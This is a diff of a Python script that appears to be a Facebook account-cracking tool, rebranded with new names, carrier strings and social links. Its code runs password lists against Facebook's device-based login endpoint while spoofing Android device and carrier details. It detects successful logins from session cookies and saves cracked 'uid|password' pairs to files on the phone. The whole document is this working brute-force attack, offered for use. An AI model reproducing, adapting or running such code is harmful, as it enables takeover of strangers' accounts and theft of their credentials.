@@ -12,6 +12,9 @@ except ModuleNotFoundError:
     pass
 print('\n\033[1;37m✅ Join Facebook')
 os.system('xdg-open https://www.facebook.com/Durlove.Acharya.1.Tera.Hi8.Baap')
+pass
+print('\n\033[1;37m✅ Join WhatsApp')
+os.system('xdg-open https://WA.me/9779809591712')
 
 from os import path
 import os,base64,zlib,pip,urllib
@@ -113,7 +116,7 @@ except ModuleNotFoundError:
 
 android_models=[]
 os.system('clear')
-print('\n\033[1;37m Cheking for updetes...');time.sleep(3)
+print('\n\033[1;37m Welcome To Durlove Tool...');time.sleep(3)
 try:
 	xx = requests.get('https://raw.githubusercontent.com/ZeaSabirTx/AFG.PRO/main/AFG.PRO.txt').text.splitlines()
 	for line in xx:
@@ -195,7 +198,7 @@ fblc = 'en_GB'
 try:
         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
 except:
-        fbcr = 'Zong'
+        fbcr = 'Namaste'
 fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
 fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
 fbdv = model
@@ -216,13 +219,13 @@ try:
                         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                         sim_id+=fbcr
                 except Exception as e:
-                        fbcr = "Zong"
+                        fbcr = "Namaste"
                         sim_id+=fbcr
         else:
-                fbcr = 'mtn'
+                fbcr = 'ncell'
                 sim_id+=fbcr
 except:
-        fbcr = "Zong"
+        fbcr = "Namaste"
 device = {
         'android_version':android_version,
         'model':model,
@@ -364,11 +367,11 @@ def menu():
 							crack_submit.submit(api3,ids,names,passlist)
 				print('\033[1;37m')
 				linex()
-				print(' The process has completed')
+				print(' Game finished 🥱')
 				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 				linex()
 				input(' Press enter to back ')
-				os.system('python ZEA.py')
+				os.system('python D.py')
 			elif xd in ['z','0z']:
 				afg()
 			elif xd in ['z','0z']:
@@ -391,7 +394,7 @@ def api1(ids,names,passlist):
                 try:
                         last = names.split(' ')[1]
                 except:
-                        last = 'Khan'
+                        last = 'nepal'
                 ps = first.lower()
                 ps2 = last.lower()
                 for fikr in passlist:
@@ -401,18 +404,18 @@ def api1(ids,names,passlist):
                         getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        ZEA=session.cookies.get_dict().keys()
-                        if "c_user" in ZEA:
+                        D=session.cookies.get_dict().keys()
+                        if "c_user" in D:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print('\r\r\033[1;32m [RIP-OK] %s | %s'%(ids,pas))
-                                open('/sdcard/ZEA-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open('/sdcard/D-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in ZEA:
+                        elif 'checkpoint' in D:
                                 if 'y' in pcp:
                                         print('\r\r\x1b[38;5;208m [RIP-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/ZEA-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/D-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -454,7 +457,7 @@ def api1(ids,names,passlist):
                         fbpn = 'com.facebook.katana'
                         en = random.choice(['en_US','en_GB'])
                         cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853','SM-N960F',])
-                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
+                        network = random.choice(['Namaste','Ncell','SkyWifi','Telekom China'])
                         network = random.choice(['MTN','AWcc','Etisalat','Roshan','Salaam'])
                         ua = 'Dalvik/2.1.0 (Linux; U; Android 10; SM-N960F Build/QP1A.190711.020) [FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/{density=2.5,width=1440,height=2960};FBLC/pt_BR;FBRV/'+str(random.randint(000000000,999999999))+str(random.randint(000000000,999999999))+';FBCR/O2;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-N960F;FBSV/29.0;FBOP/1;FBCA/arm64-v8a;]'
                         
